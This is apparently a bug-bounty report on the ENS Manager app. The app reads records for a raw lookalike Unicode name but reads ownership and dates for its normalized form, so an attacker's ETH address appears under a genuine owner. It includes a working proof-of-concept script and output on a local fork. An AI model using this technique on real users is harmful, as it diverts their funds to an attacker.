# 90693 w a critical the manager profile page reads records from the raw url name and ownership from its ensip 15 name so an attacker controlled address record is rendered under a real name s owner

**Submitted on Aug 26th 2026 at 12:52:27 UTC by @gzeon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90693
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

`/$name` in the Manager builds one page out of two different ENS nodes. Records, which means text, avatar, and every coin address including ETH, are fetched with the route parameter exactly as it appears in the URL. Ownership, primary name and expiry are fetched after ENSIP-15 normalization. For any URL whose label normalizes to something else, the page shows the real owner of the normalized name next to records nobody but the holder of the raw name can write. Registering the raw label is ordinary and cheap, so an attacker can publish a URL that reads like the target name, carries the target's genuine owner, expiry and registration date, and offers the attacker's address as the ETH address to send to.

## Vulnerability Details

The route parameter is not normalized before it is used. `apps/manager/src/routes/$name/route.tsx:3-19` accepts any string of three or more characters containing a dot. The loader then issues both queries against that raw string (`apps/manager/src/routes/$name/index.tsx:51-56`):

```ts
const [profileRecords, ownerData] = await Promise.all([
  queryClient.ensureQueryData(profileRecordsQuery(name)),
  queryClient.fetchQuery(profileOwnerQuery(name)),
])
```

The two queries then disagree about which name they mean.

**Records use the raw string.** `apps/manager/src/features/profile/service/profileRecords.ts:82` takes `name` and passes it straight to the indexer (`:94-97`) and to ensjs (`:122-131`):

```ts
export const getProfileRecords = ResultFn(async function* (name: string) {
  …
  const records = yield* fromPromise(
    getRecords(client, { name, texts, coins, contentHash: true, abi: true, ignoreInvalidCoinTypes: true }),
```

`getRecords` never normalizes the name it resolves *against*. With no `resolver` argument it takes the `resolveNameData` branch (`getRecords.ts:372-382`), which DNS-encodes the string it was handed and gives that to the Universal Resolver (`resolveNameData.ts:70,83-94`; an array of calls is wrapped in `multicall(bytes[])` first). The resolver that answers is therefore the one registered for the raw node.

The one place ensjs does normalize is worth stating precisely. `getTextParameters` builds `text` calls with `namehash(name)`, the raw node (`src/utils/coders/getText.ts:45-51`), while `getAddressParameters` builds `addr` calls with `namehash(normalize(name))`, the ENSIP-15 node (`src/utils/coders/getAddress.ts:92-139`). Text records therefore come from the raw node under any resolver. The address record does too, because `PermissionedResolver.resolve` rewrites the node in each wrapped call to the node of the DNS-encoded name it was handed, and `PermissionedResolver` is the resolver in play: it is what the app's own registration deploys for the name (`registration-calls.ts:255-268`), and it is what every v2 name registered through this path is pointed at. Step 3 of the proof of concept shows the rewrite. `addr(normalizedNode)` called directly on the attacker's resolver returns the zero address, because the attacker never wrote that node, and yet the wrapped `resolve(dnsEncode(rawName), multicall([text(rawNode), addr(normalizedNode)]))` returns the attacker's address for the addr element.

The indexer does not gate this. `profileRecords.ts:116-120` builds the coin list as `unique([...alwaysProbeAddressRecords.map(Number), ...addressRecords.map(r => r.coinType), ...indexerRecords.coins])`, and `alwaysProbeAddressRecords` is `['60']` (`data/records/utils.ts:42`). Coin type 60 is read on chain on every profile load whatever the indexer says, and the same is true of every key in `staticTextRecords` and `textRecords`. An indexer that filters unnormalized names out of its listings does not stop the ETH address record from being fetched and displayed.

**Ownership, primary name and expiry use the ENSIP-15 name.** `profileOwner.ts:25` runs the same string through `normalizeEthName`, which is viem's `normalize`, that is `ens_normalize` (`profileName.ts:14-21`), and asks the chain about the normalized name (`profileOwner.ts:56`):

```ts
const ethName = normalizeEthName(params.name)
…
const v2Owner = yield* fromPromise(ensjsv2_getOwner(client, { name: ethName.name }), …)
```

`profileExpiry.ts:77` does the same through `normalizeEth2LdName`. `profileRegistration.ts:66,115-119` reads the registration date for the normalized name too. `ProfileView` then hands the raw `name`, the normalized-node `owner`, that owner's reverse name, the normalized-node expiry and registration date, and the raw-node `records` to one header and one card stack (`ProfileView.tsx:99-118,192-217`):

```tsx
<ProfileHeader
  name={name}                             // raw route parameter
  owner={owner}                           // from the ENSIP-15 node
  ownerReverseName={ownerReverseName.data} // that owner's primary name
  records={records}                        // from the raw node
  …
/>
```

`ProfileCards` passes the same `records` to `ProfileAddressesSection` (`ProfileCards.tsx:21-25`), which picks the coin-type-60 entry out of them (`ProfileView.helpers.ts:16,229-244`) and renders it under the heading "Main receiving address" (`ProfileAddressesSection.tsx:168-173`) inside a `CopyableButton` (`ProfileAddressesSection.tsx:90-95`).

So for `/ｈello.eth`, where `ｈ` is U+FF48 and reads as a lowercase `h`:

| Element on the page                                                                  | Node it comes from                                                                             |
| ------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| Header name, avatar, description, ETH address record, every text and coin record     | `namehash("ｈello.eth")` = `0x5e8631d433e536ba964a75a0a1abd2012c8357a6c956c267c877457c511f9d75` |
| Owner address, owner's primary name, expiry, registration date, "you own this" state | `namehash("hello.eth")` = `0x810b85f0418528b1ba4aa88307c7a24bc2409b383186b78f8ceabf59d9073845` |

The second node is the real `hello.eth`, which is registered on Sepolia. The first is whatever the attacker registered.

**Acquiring the first node costs one ordinary registration, and the registration sets the address record for you.** `ETHRegistrar.register(string label, …)` hashes the label bytes it is given, so `ｈello` is a registerable label like any other. The Manager will do it: `/register/$name` derives its label with `parseName`, whose whole normalization is `name.trim().toLowerCase()` (`apps/manager/src/features/register-v2/utils/name-parser.ts:46`), and that label reaches `register(label, …)` unchanged through `registration.hca.actors.ts:498,973,993-1004` and `registration-calls.ts:286,288`. The hand-rolled input check in front of it (`nameUtils.ts:90-142`) rejects spaces, `..`, an inner dot, labels under three code points and one ASCII blacklist; U+FF48 is not among them. On the smart-account path the reveal batch it builds always includes `setAddr(node, 60, wallet)` where `node = namehash(label + '.eth')` from the raw label (`registration-calls.ts:213-214,217-224,300-305`), so the ETH address record on the raw node points at the registrant the moment the registration confirms. The EOA fallback writes that record only when the post-registration setup asked for it (`registrationUi.machine.ts:153-155`), and any client that can call `ETHRegistrar.register` and a resolver's `setAddr` gets the same result in two transactions.

**The sibling app in the same repository, also in scope, implements the missing check.** The Explorer's `/$name` route gates on it and renders a 404 rather than a profile (`apps/portal/src/routes/$name/index.tsx:441-453,457-460`):

```tsx
// Validate name format - must be a valid ENS name (normalized + ends with .eth)
const isValidName = isValidEnsName(name)
…
  query: {
    // Don't fetch resolver for invalid names
    enabled: isValidName,
  },
…
// Show 404 for invalid/malformed names
if (!isValidName) {
  return <InvalidNameMessage title="Invalid name" />
}
```

`isValidEnsName` (`apps/portal/src/utils/token/isNormalized.ts:39-57`) requires every label to be ENSIP-15 normalized, and returns `false` for `ｈello.eth`, `ⓗello.eth`, `𝐡ello.eth`, `ℎello.eth` and `HELLO.eth`, and `true` for `hello.eth`. The Explorer also badges unnormalized names "Not normalized" in its reverse-resolution table (`ReverseResolutionTable/columns.tsx:72-77`). The Manager route has neither the gate nor the badge. `isNormalized` and `isValidEnsName` do not appear anywhere under `apps/manager/src`, and the app has no `src/utils/token/` directory at all.

The class is wide. Every one of these passes the Manager's checks and normalizes to `hello.eth`: `ｈello` (fullwidth U+FF48), `ⓗello` (U+24D7), `𝐡ello` (U+1D421), `ℎello` (U+210E), and `ｈｅｌｌｏ` in full width. A soft hyphen anywhere in the label does the same and is invisible in every font. The same construction exists for any target name.

## Impact Details

In-scope impact selected: **Critical, (Websites and Applications) Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as resolving or rendering an ENS name to an attacker-controlled address.**

The page an attacker produces carries the target's real credentials:

* The title reads `ｈello.eth`, which is `hello.eth` to the eye.
* The owner field is `value={ownerReverseName || truncateAddress(owner)}` (`ProfileDetails.tsx:113-122`). Either branch prints the genuine name's owner: their primary name when they have one, their address otherwise. In the proof of concept below it prints `happi1337.eth`, the primary name of `hello.eth`'s owner. It is not the target name, and it does not need to be. It is a name the attacker cannot set and a visitor can look up.
* The expiry and registration date are `hello.eth`'s.
* The description, links and every other text record come from the same raw node as the address: `getTextParameters` builds `text` calls on `namehash(rawName)` (`src/utils/coders/getText.ts:45-51`) and every key in `staticTextRecords` and `textRecords` is probed (`profileRecords.ts:109-115`). The attacker writes them to match the target. The avatar is fetched from an external metadata service keyed on the raw name (`profileAvatar.ts:11-22`); that service is out of scope and this report makes no claim about it.
* The addresses card is headed **Main receiving address** (`ProfileAddressesSection.tsx:168-173`) and its value is the coin-type-60 entry read from the raw node (`ProfileView.helpers.ts:16,229-244`), rendered inside a `CopyableButton` (`ProfileAddressesSection.tsx:90-95`). That is the attacker's address, presented under that heading, with a copy control on it.

The three fields a careful user checks to confirm they are on the right profile, the owner, the registration date and the expiry, are all served from the genuine name. The one value that moves money is served from the attacker's. A user who opens the link, sees the owner they expect, and copies the address sends to the attacker.

The delivery is a lookalike URL, and that part is ordinary phishing. What is not ordinary is that the application then vouches for it. One page presents two names' data as one name's data: the ownership evidence it prints belongs to a name whose records it is not showing.

The clearest way to see that the app is the cause is to ask what a correct page would show. The attacker owns the node behind that URL, and `findOwner` returns them for it, as step 3 of the proof of concept prints. A page that read one name would therefore label the profile with the attacker's address, an address the visitor does not recognise, and the visitor's check would work. The split is what replaces that address with the target's, and it is what makes the lookalike credible. A user who does the correct thing, reading the owner field to confirm the profile is genuine, is misled by it on every URL in this class.

A wallet has little to work with. The transfer is an ordinary send to an ordinary address, so there is no ENS name in the transaction to re-resolve and no signature to compare against the page. Generic recipient warnings, address books and scam lists still apply, as they do to any send.

None of this rests on the URL being indistinguishable. A visitor who notices `%EF%BD%88` in the address bar still has nothing to act on: the page states that its owner is `happi1337.eth`, with that name's real registration date and expiry. The URL is one signal; the app contradicts it with three.

Two things are worth stating plainly rather than leaving for a reviewer to find. The visitor has to open an attacker's link and choose to copy an address, so this is not a zero-interaction bug. And the address the page shows does correctly resolve for the raw name that is in the URL. The defect is that the same page attributes a different name's owner, registration date and expiry to it. That attribution is the part a careful visitor relies on, and the part the attacker cannot forge on their own.

Two secondary consequences follow from the same split:

* The genuine owner of `hello.eth` sees `isOwner` true on the attacker's page (`ProfileView.tsx:119`), because ownership is read from their node. If they are connected and the name is a v2 name outside its grace period, the edit affordances render for them (`ProfileActions.tsx:107-122`) over records they cannot write. The mirror of that is a constraint on the attacker: the Manager treats them as not the owner, so they add text records through the Explorer or a direct resolver call rather than through this app.
* The reverse case costs a buyer instead of a visitor. `/register/$name` writes the raw label, so a buyer who follows a link like `/register/%EF%BD%88ello.eth` pays for a node whose ownership, expiry and registration-date lookups in this same app all resolve to somebody else's name.

Delivery is a URL. Nothing is injected into the app, no wallet needs to be connected for the page to render, and the link is the whole payload, pointing at the real `app.ens.dev` origin with a valid certificate. How a given channel displays it varies, since some clients percent-encode a non-ASCII path.

## References

### The split

* `apps/manager/src/routes/$name/route.tsx:3-19` - route parameter accepted without normalization
* `apps/manager/src/routes/$name/index.tsx:51-56,173` - both queries and `ProfileView` take the raw parameter
* `apps/manager/src/features/profile/service/profileRecords.ts:82,94-97,122-131,165-169` - records read for the raw name
* `apps/manager/src/features/profile/service/profileOwner.ts:25,56` - ownership read for the ENSIP-15 name
* `apps/manager/src/features/profile/service/profileName.ts:14-21` - `normalize` from `viem/ens`
* `apps/manager/src/features/profile/service/profileExpiry.ts:77,94,105-106` - expiry read for the ENSIP-15 name
* `apps/manager/src/features/profile/components/view/ProfileView.tsx:99-118,192-217` - one header and card stack, two nodes
* `apps/manager/src/features/profile/components/view/ProfileCards.tsx:21-25` - raw-node records forwarded to the addresses card
* `apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:90-95,168-173` - the "Main receiving address" heading and its `CopyableButton`
* `apps/manager/src/features/profile/components/view/ProfileView.helpers.ts:16,229-244` - the main receiving address is coin type 60
* `apps/manager/src/features/profile/service/profileRegistration.ts:66,115-119` - registration date read for the ENSIP-15 name
* `apps/manager/src/features/profile/components/view/ProfileDetails.tsx:113-122` - the owner field prints the owner's primary name
* `apps/manager/src/features/profile/components/view/ProfileActions.tsx:107-122` - the edit affordances gated on `isOwner`
* `@ensdomains/ensjs` `getRecords` resolves the caller's string through the Universal Resolver without normalizing it: `src/actions/public/getRecords.ts:341-348,372-382`, `src/actions/public/resolveNameData.ts:70,83-94`
* `getTextParameters` uses the raw node, `getAddressParameters` uses the normalized node, and the resolver overrides both: `src/utils/coders/getText.ts:45-51`, `src/utils/coders/getAddress.ts:92-139`

### Acquiring the raw node

* `apps/manager/src/features/register-v2/utils/name-parser.ts:46,67`
* `apps/manager/src/features/shared/registration/nameUtils.ts:90-142`
* `apps/manager/src/routes/register/$name.tsx:24,57,71`
* `packages/transaction-manager/src/machines/registration/registration.hca.actors.ts:498,973,993-1004`
* `packages/smart-account/src/providers/rhinestone/registration-calls.ts:213-214,217-224,286,288,300-305`
* `apps/manager/src/features/register-v2/state/registrationUi.machine.ts:153-155`

### The check the Manager is missing, present in the Explorer

* `apps/portal/src/routes/$name/index.tsx:441-453,457-460`
* `apps/portal/src/utils/token/isNormalized.ts:24-27,39-57`
* `apps/portal/src/features/reverse-resolution/components/ReverseResolutionTable/columns.tsx:72-77`

### Standards

* ENSIP-15, the normalization every ENS client applies: <https://docs.ens.domains/ensip/15>
* viem `normalize` is `@adraffy/ens-normalize@1.11.1` `ens_normalize`

All cited files entered the competition repository at the import commit `cda79ac` and are unchanged at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, the current head of `audit-comp-ready`. There is no fix attempt.

## Proof of Concept

One script and one browser session, both against a local Sepolia fork with the real ENS contracts. No public testnet or mainnet state is touched, and nothing is written into the checkout.

**What the attacker needs, and what the fork is for.** The attacker's whole assumption set is that they can register an ENS name and the victim opens a link. The fork stands in for one thing: a chain on which the twin label is already registered. On the live deployment the attacker buys that state for 8.000021 USDC a year through the shipped `/register` flow. The defect itself is client-side and transport-independent, because `getProfileRecords` asks the Universal Resolver about the raw name while `getOwner` asks it about the normalized one, through the same client. Four steps below use fork mechanics that have mundane live equivalents, and none of them is a capability the attack requires:

| In the script                                | What a live attacker does                                                                                                                                      |
| -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `anvil_setCode <attacker> 0x`                | Uses a plain EOA. Anvil's default keys carry a stray EIP-7702 delegation on Sepolia that makes the ERC-1155 receiver hook revert                               |
| `mint(attacker, …)` on MockUSDC              | Buys or faucets USDC                                                                                                                                           |
| `evm_increaseTime 120`                       | Waits out the registrar's 60-second commitment cooldown                                                                                                        |
| `VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8547` | Nothing. The victim's browser uses whatever endpoint the deployment configures (`apps/manager/src/lib/wagmi.ts:19,22-38`), and it returns the same two answers |

Prerequisites: Foundry (`anvil`, `cast`), Node 22, `pnpm install --frozen-lockfile` in a checkout of `immunefi-team/audit-comp-ens` at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, and any Sepolia RPC URL.

{% stepper %}
{% step %}

## Start the fork

Start the fork, pinned so the transcript reproduces:

```bash
anvil --fork-url https://sepolia.gateway.tenderly.co --fork-block-number 11570308 --port 8547
```

{% endstep %}

{% step %}

## Run the proof-of-concept script

Run this once against that fresh fork, from `apps/manager` so the `normalize` line can import viem:

```bash
#!/usr/bin/env bash
set -euo pipefail
PORT="${PORT:-8547}"
RPC=http://127.0.0.1:$PORT

UR=0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe        # UniversalResolver
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc  # ETHRegistrar (v2)
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef    # VerifiableFactory
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e       # PermissionedResolver impl
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
ZERO=0x0000000000000000000000000000000000000000
ZERO32=0x0000000000000000000000000000000000000000000000000000000000000000
ROLES_ALL=0x1111111111111111111111111111111111111111111111111111111111111111
SECRET=0x4444444444444444444444444444444444444444444444444444444444444444

ATTACKER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
ATTACKER_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

TARGET=hello.eth              # a real, registered Sepolia ENSv2 name
TWIN_LABEL=ｈello             # U+FF48 FULLWIDTH LATIN SMALL LETTER H, then "ello"
TWIN=ｈello.eth

dnsencode() { python3 -c "import sys;print(''.join('%02x%s'%(len(l.encode()),l.encode().hex()) for l in sys.argv[1].split('.'))+'00')" "$1"; }

echo "### 0. local Sepolia fork"
if ! cast block-number --rpc-url $RPC >/dev/null 2>&1; then
  echo "ABORT: no anvil on $RPC. Start it first:"
  echo "  anvil --fork-url <sepolia rpc> --fork-block-number 11570308 --port $PORT"
  exit 1
fi
echo "forked Sepolia at block $(cast block-number --rpc-url $RPC), chain id $(cast chain-id --rpc-url $RPC)"

echo
echo "### 1. one name to ENSIP-15, two labels on chain"
node --input-type=module -e "
import { normalize } from 'viem/ens'   // this is what the app calls
const n = process.argv[1]
console.log('  route parameter            = ' + JSON.stringify(n))
console.log('  normalize(route parameter) = ' + JSON.stringify(normalize(n)))
" "$TWIN" 2>/dev/null || echo "  (run from apps/manager for the normalize line)"
echo "  isAvailable(\"hello\")       = $(cast call $REGISTRAR 'isAvailable(string)(bool)' hello --rpc-url $RPC)"
echo "  isAvailable(\"$TWIN_LABEL\")      = $(cast call $REGISTRAR 'isAvailable(string)(bool)' "$TWIN_LABEL" --rpc-url $RPC)"
echo "  real owner of $TARGET     = $(cast call $UR 'findOwner(bytes)(address)' "0x$(dnsencode "$TARGET")" --rpc-url $RPC)"

echo
echo "### 2. the attacker registers the twin through the real ETHRegistrar"
# Three fork mechanics, none of them an attacker capability:
#  - anvil's default keys carry a stray EIP-7702 delegation on Sepolia, which
#    makes the ERC-1155 receiver hook revert. A live attacker uses a plain EOA.
#  - MockUSDC has a public `mint`. A live attacker buys or faucets USDC.
#  - `evm_increaseTime` waits out the registrar's 60-second commitment cooldown.
#    A live attacker waits 60 seconds.
cast rpc anvil_setCode $ATTACKER 0x --rpc-url $RPC >/dev/null
cast send $USDC "mint(address,uint256)" $ATTACKER 1000000000 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
INIT=$(cast calldata "initialize(address,uint256,bytes[])" $ATTACKER $ROLES_ALL "[]")
RESOLVER=$(cast call $FACTORY "deployProxy(address,uint256,bytes)(address)" $IMPL 424242 "$INIT" --from $ATTACKER --rpc-url $RPC)
cast send $FACTORY "deployProxy(address,uint256,bytes)(address)" $IMPL 424242 "$INIT" --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
PRICE=$(cast call $REGISTRAR 'getRegisterPrice(string,uint64,address)(uint256,uint256)' "$TWIN_LABEL" 31536000 $USDC --rpc-url $RPC | head -1 | awk '{print $1}')
COMMIT=$(cast call $REGISTRAR "makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)" "$TWIN_LABEL" $ATTACKER $SECRET $ZERO $RESOLVER 31536000 $ZERO32 --rpc-url $RPC)
cast send $REGISTRAR "commit(bytes32)" $COMMIT --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
cast rpc evm_increaseTime 120 --rpc-url $RPC >/dev/null; cast rpc evm_mine --rpc-url $RPC >/dev/null
cast send $USDC "approve(address,uint256)" $REGISTRAR 1000000000 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
cast send $REGISTRAR "register(string,address,bytes32,address,address,uint64,address,bytes32)" "$TWIN_LABEL" $ATTACKER $SECRET $ZERO $RESOLVER 31536000 $USDC $ZERO32 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
# The Manager's own reveal batch writes exactly this record on the HCA path
# (packages/smart-account/src/providers/rhinestone/registration-calls.ts:213-214,217-224).
cast send $RESOLVER "setAddr(bytes32,uint256,bytes)" "$(cast namehash "$TWIN")" 60 $ATTACKER --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
echo "  attacker                   = $ATTACKER"
echo "  attacker's resolver        = $RESOLVER"
echo "  paid                       = $PRICE USDC units for one year"
echo "  registered on              = $(python3 -c "import datetime,sys;print(datetime.datetime.utcfromtimestamp(int(sys.argv[1])).strftime('%Y-%m-%d'))" "$(cast block latest --field timestamp --rpc-url $RPC)") (the fork's clock)"

echo
echo "### 3. two unrelated names, and a resolver that answers for the raw one"
NORM_NODE=$(cast namehash "$TARGET")
echo "  findOwner($TARGET)        = $(cast call $UR 'findOwner(bytes)(address)' "0x$(dnsencode "$TARGET")" --rpc-url $RPC)"
echo "  findOwner($TWIN)         = $(cast call $UR 'findOwner(bytes)(address)' "0x$(dnsencode "$TWIN")" --rpc-url $RPC)"
# ensjs builds `text` calls on namehash(rawName) and `addr` calls on
# namehash(normalize(name)). Neither node survives: PermissionedResolver.resolve
# rewrites it to the node of the DNS-encoded name it was handed. Both call
# shapes are run, because `getRecords` uses the multicall shape for >1 record.
echo "  attacker resolver, addr(namehash($TARGET))  = $(cast call $RESOLVER 'addr(bytes32)(address)' "$NORM_NODE" --rpc-url $RPC)"
echo "  attacker resolver, addr(namehash($TWIN)) = $(cast call $RESOLVER 'addr(bytes32)(address)' "$(cast namehash "$TWIN")" --rpc-url $RPC)"
echo "  through the Universal Resolver, as the app asks:"
echo "    resolve(dns($TWIN), addr(normNode))                     = $(cast call $UR 'resolve(bytes,bytes)(bytes,address)' "0x$(dnsencode "$TWIN")" "$(cast calldata 'addr(bytes32)' "$NORM_NODE")" --rpc-url $RPC | head -1)"
MC=$(cast calldata 'multicall(bytes[])' "[$(cast calldata 'text(bytes32,string)' "$(cast namehash "$TWIN")" description),$(cast calldata 'addr(bytes32)' "$NORM_NODE")]")
MCOUT=$(cast abi-decode 'f()(bytes[])' "$(cast call $UR 'resolve(bytes,bytes)(bytes,address)' "0x$(dnsencode "$TWIN")" "$MC" --rpc-url $RPC | head -1)")
echo "    resolve(dns($TWIN), multicall([text(rawNode),addr(normNode)])):"
echo "      addr element decodes to 0x$(python3 -c "import sys,re;print(re.findall(r'0x[0-9a-fA-F]+',sys.argv[1])[-1][-40:])" "$MCOUT")"

echo
echo "The attacker owns one name. The Universal Resolver serves their address for it."
echo "Now open the Manager on this fork and read the page."
```

{% endstep %}

{% step %}

## Verify the script output

```
$ cd apps/manager && bash poc-crit02.sh
### 0. local Sepolia fork
forked Sepolia at block 11570308, chain id 11155111

### 1. one name to ENSIP-15, two labels on chain
  route parameter            = "ｈello.eth"
  normalize(route parameter) = "hello.eth"
  isAvailable("hello")       = false
  isAvailable("ｈello")      = true
  real owner of hello.eth     = 0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8

### 2. the attacker registers the twin through the real ETHRegistrar
  attacker                   = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  attacker's resolver        = 0xF85AfBFbc8c73ebb50AdD80B019153Ab45d14DaA
  paid                       = 8000021 USDC units for one year
  registered on              = 2026-08-26 (the fork's clock)

### 3. two unrelated names, and a resolver that answers for the raw one
  findOwner(hello.eth)        = 0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8
  findOwner(ｈello.eth)         = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  attacker resolver, addr(namehash(hello.eth))  = 0x0000000000000000000000000000000000000000
  attacker resolver, addr(namehash(ｈello.eth)) = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  through the Universal Resolver, as the app asks:
    resolve(dns(ｈello.eth), addr(normNode))                     = 0x00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
    resolve(dns(ｈello.eth), multicall([text(rawNode),addr(normNode)])):
      addr element decodes to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8

The attacker owns one name. The Universal Resolver serves their address for it.
Now open the Manager on this fork and read the page.
```

Reading it:

* `hello.eth` is a real, registered Sepolia name. `ｈello.eth` normalizes to it under ENSIP-15 and is a separate, free label to the registrar.
* The attacker registers that label for 8.000021 USDC a year and sets the ETH address record, which is what the Manager's own reveal batch does on the smart-account path (`registration-calls.ts:213-214,217-224`).
* The two names have different owners. The attacker's resolver returns the zero address when asked directly for `namehash("hello.eth")`, because the attacker never wrote that node, and yet through the Universal Resolver it answers with the attacker's address for both call shapes ensjs uses: the single `addr` call carrying the normalized node, and the `multicall` bundle that `resolveNameData` builds whenever more than one record is requested. That is the node rewrite, and it is why ensjs normalizing the `addr` node changes nothing.
  {% endstep %}

{% step %}

## Render the affected page

With that fork still running, put `VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8547` in `apps/manager/.env.local` and start the app with `pnpm dev:manager`. Open both URLs with no wallet connected and read `document.body.innerText`. No mocks, no test harness, no instrumentation: this is the shipped page.

`http://localhost:3000/%EF%BD%88ello.eth`, the attacker's URL. Tab title `ｈello.eth - ENS Profile`:

```
dehaze
search
CONNECT
ｈello.eth
key_vertical
Owner
happi1337.eth
calendar_clock
Registered
AUG.12.2026
history
Expires
AUG.12.2027
About
Addresses
Main receiving address
ｈello.eth
0x7099...79C8
RENEW NAME
```

`http://localhost:3000/hello.eth`, the genuine page. Tab title `hello.eth - ENS Profile`:

```
dehaze
search
CONNECT
hello.eth
key_vertical
Owner
happi1337.eth
calendar_clock
Registered
AUG.12.2026
history
Expires
AUG.12.2027
About
RENEW NAME
```

{% endstep %}
{% endstepper %}

The two pages carry the same owner, `happi1337.eth`, the same registration date and the same expiry. `happi1337.eth` is the primary name of `hello.eth`'s owner, printed by `ProfileDetails.tsx:113-122`; the attacker has no connection to it and cannot set it. The attacker's page adds one thing the genuine page does not have: a card headed **Main receiving address** holding `0x7099...79C8`, the attacker's address, with a copy control on it.

The twin was registered on the fork's clock on 2026-08-26, and its page reports the name as registered on 2026-08-12 and expiring 2027-08-12. Those are `hello.eth`'s dates, two weeks earlier than the twin could possibly have.

A visitor who lands on the first URL, checks the owner, recognises `happi1337.eth`, and copies the address under "Main receiving address" sends to the attacker.
